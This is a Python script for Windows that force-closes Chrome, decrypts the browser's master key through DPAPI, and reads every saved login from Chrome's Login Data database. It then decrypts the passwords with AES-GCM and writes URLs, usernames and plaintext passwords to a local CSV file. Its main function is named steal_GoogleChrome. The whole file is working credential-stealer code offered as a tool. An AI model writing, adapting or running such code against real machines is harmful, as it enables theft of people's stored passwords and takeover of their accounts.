#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import os
import json
import base64
import win32crypt
import sqlite3
from Crypto.Cipher import AES
import datetime
import subprocess

# Global variables
out_file_name = "UserData.csv"

chrome_user_data_path = os.path.normpath(os.getenv("LOCALAPPDATA") + "/Google/Chrome/User Data")
chrome_login_data_path = os.path.join(chrome_user_data_path, "Default", "Login Data")
chrome_key_path = os.path.join(chrome_user_data_path, "Local State")

def filetime_to_datetime(ft):
    EPOCH_AS_FILETIME = 116444736000000000  # January 1, 1970 as MS file time, the number of 100-nanosecond intervals
    us = (ft - EPOCH_AS_FILETIME) // 10
    return datetime.datetime(1970, 1, 1) + datetime.timedelta(microseconds = us)

def steal_GoogleChrome():
    subprocess.call("taskkill /f /im chrome.exe", shell=True)

    with open(chrome_key_path, 'r', encoding='utf-8') as file:
        data = json.load(file)
        encrypted_key = data['os_crypt']['encrypted_key']

    encrypted_key = base64.b64decode(encrypted_key)

    # Key prefix for a key encrypted with DPAPI.
    DPAPI_key_prefix = "DPAPI"

    encrypted_key = encrypted_key[len(DPAPI_key_prefix):]

    decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

    except_appeared = False
    try:
        conn = sqlite3.connect(chrome_login_data_path)

        curs = conn.cursor()
        curs.execute("SELECT origin_url, username_value, password_value, date_last_used FROM logins")

        login_data = curs.fetchall()
    except sqlite3.DatabaseError as err:
        except_appeared = True
        print("Error with Google Chrome: ", err)
        print("Make sure Google Chrome is not running and try again")
    finally:
        conn.close()

    if except_appeared:
        return False

    if not login_data:
        print("No userdata stored in Google Chrome")
        return False

    # Version prefix for data encrypted with profile bound key
    version_prefix = "v10";

    iv_length = 12; # 96 / 8
    auth_tag_length = 16; # 128 / 8

    with open(out_file_name, 'w') as file:
        file.write("Google Chrome\n\n")
        file.write("url;username;password;date_last_used\n")
        for raw in login_data:
            line = ";".join(raw[:-2])
            encrypted_password = raw[2]
            encrypted_password = encrypted_password[len(version_prefix):]
            iv = encrypted_password[:iv_length]
            auth_tag = encrypted_password[-auth_tag_length:]
            encrypted_password = encrypted_password[iv_length:-auth_tag_length]

            cipher = AES.new(decrypted_key, AES.MODE_GCM, nonce=iv)
            password = cipher.decrypt_and_verify(encrypted_password, auth_tag)
            password = password.decode("utf-8")

            date_last_used = filetime_to_datetime(raw[3]*10) # time in Chrome is stored divided by 10 for some reason

            line = line + ";{0};{1}".format(password, date_last_used)
            file.write(line + "\n")

    return True

# Start
print("Console app that searches for browser user data and writes it to a .csv file\n")

installed_browsers = []

if os.path.exists(chrome_login_data_path):
    installed_browsers.append("Google Chrome")

if not installed_browsers:
    sys.exit("Couldn't find any browsers on your computer")

print("Detected browsers:")
for browser in installed_browsers:
    print(browser)
print()

at_least_one = False
if "Google Chrome" in installed_browsers:
    if steal_GoogleChrome():
        at_least_one = True

if at_least_one:
    print("\nFile \"{}\" has been successfully created".format(out_file_name))
